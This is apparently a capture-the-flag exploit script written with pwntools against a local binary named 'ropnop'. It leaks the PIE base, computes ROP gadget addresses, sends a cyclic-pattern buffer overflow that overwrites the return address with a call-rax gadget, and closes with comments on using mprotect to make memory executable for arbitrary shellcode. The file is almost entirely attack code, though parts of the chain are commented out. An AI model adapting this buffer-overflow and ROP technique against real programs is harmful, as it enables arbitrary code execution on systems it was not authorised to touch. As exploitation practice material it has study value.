from pwn import *
from time import sleep

syscall = 0x011e4
pop_rax = 0x011e7
pop_rdi = 0x011e9
pop_rsi = 0x011eb
pop_rdx = 0x011ed
pop_rbp = 0x011ef


'''
0x1296 <+150>:	add    rsp,0x20
0x129a <+154>:	pop    rbp
0x129b <+155>:	ret
'''
'''
mprotect
0x0000000000001234 <+52>:	mov    rdi,QWORD PTR [rbp-0x8] 		rdi = address|start
0x0000000000001238 <+56>:	mov    rcx,QWORD PTR [rbp-0x10] 	rcx = end
0x000000000000123c <+60>:	mov    rdx,QWORD PTR [rbp-0x8] 		rdx = address|start
0x0000000000001240 <+64>:	sub    rcx,rdx 						
0x0000000000001243 <+67>:	mov    rsi,rcx 						rsi = size
0x0000000000001246 <+70>:	mov    edx,0x7  					rdx = edx = permissions R|W|X
0x000000000000124b <+75>:	mov    DWORD PTR [rbp-0x1c],eax 	rax = eax = 10 = mprotect
0x000000000000124e <+78>:	call   0x1060 <mprotect@plt>
'''

callrax = 0x01014
p = process("./ropnop")

raw_input("start?")
pie = int(p.recvline().split()[-4],16)
log.info("base PIE addr: {}".format(hex(pie)))
syscall = pie + syscall
poprax = pie + pop_rax
poprdi = pie + pop_rdi
poprsi = pie + pop_rsi
poprdx = pie + pop_rdx
#poprbp = pie + pop_rbp

callrax = pie + callrax

pad = cyclic(0xff+0xf)
idx = cyclic_find("gaaahaaa")

p.send(pad[:idx]+p64(callrax)+pad[:27])#+p64(59)+"SYSBBBBB"+p64(0x0)+p64(0x0)+"RBPAAAAA"+pad)
print(p.recvline())
p.send(pad)
#p.interactive()

p.close()

'''
There is a second option for exploitation, the mprotect syscall allows us to set an area of memory as executable,
with this we might be able to write our own executable instructions to an area of memory, giving us the ability to execute arbitrary shellcode.
This gives us flexibility in payloads, so we could port our exploit over to a framework like the rather excellent metasploit.
'''